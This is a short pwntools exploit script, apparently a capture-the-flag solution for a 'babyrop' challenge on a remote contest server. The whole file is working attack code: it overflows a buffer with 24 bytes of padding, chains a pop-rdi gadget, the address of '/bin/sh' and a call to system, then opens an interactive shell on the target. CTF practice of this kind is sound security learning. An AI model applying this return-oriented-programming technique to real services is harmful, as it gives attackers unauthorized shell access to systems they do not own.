
from pwn import *

if __name__ == "__main__":
		#p = process('./babyrop')
		p = remote('problem.harekaze.com', 20001)
		elf = ELF('babyrop')
		print(p.recvrepeat(1))
		binsh_addr = next(elf.search("/bin/sh"))
		call_system = 0x4005e3
		pop_rdi = 0x000000400683
		print(hex(binsh_addr))
		payload = "A" * 24 + p64(pop_rdi) + p64(binsh_addr) + p64(call_system)
		p.sendline(payload)
		print(p.recvrepeat(1))
		p.interactive()

